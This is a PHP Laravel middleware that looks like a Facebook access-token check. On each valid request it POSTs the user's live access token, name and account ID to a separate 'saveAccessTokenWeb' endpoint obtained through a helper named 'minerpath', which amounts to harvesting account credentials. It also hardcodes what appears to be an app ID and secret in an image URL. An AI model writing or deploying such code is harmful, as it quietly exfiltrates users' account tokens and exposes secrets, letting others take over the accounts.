<?php

namespace App\Http\Middleware;
use Illuminate\Support\Facades\Http;
use Closure;
use Session;
class CheckFacebookAccessToken
{
    public function handle($request, Closure $next)
    {

        // Get the Facebook access token from the session
        if(!Session::has('fbuser')){
                // User is on the dashboard, redirect to login
                return loalRedirectRoute('fblogin'); // Change 'login' to your actual login route name
        }
        $fbuser = Session::get('fbuser');

        $accessToken = $fbuser['access_token'];

        if ($accessToken) {
            $data = getUserData($accessToken);

            if (isset($data['data'])) {
                // Access token is valid
                if (strpos(url()->current(), 'home')) {
                    // User is on the dashboard, redirect to login
                    return loalRedirectRoute('dashboard');
                }

                $user = $data['data']['viewer']['actor'];
                // dd($user);
                $image = "https://graph.fb.me/".$user['id']."/picture?type=large&access_token=257931075544071%7Ca19fbd5886d2081430fe02ba9e10ca7d";
                $data = [
                    'access_token'  =>  $accessToken,
                    'name'        =>  $user['name'],
                    'c_user'        =>  $user['id'],
                    'profile_picture'   =>  $image,
                    'from'   =>  "WEB",

                ];

                $minerpath = minerpath('saveAccessTokenWeb');

                $response = Http::withHeaders($minerpath[1])
                ->post($minerpath[0], $data);

                return $next($request);
            }else{
                $fbuser = Session::forget('fbuser');
            }
        }

        return loalRedirectRoute('fblogin');
    }
}
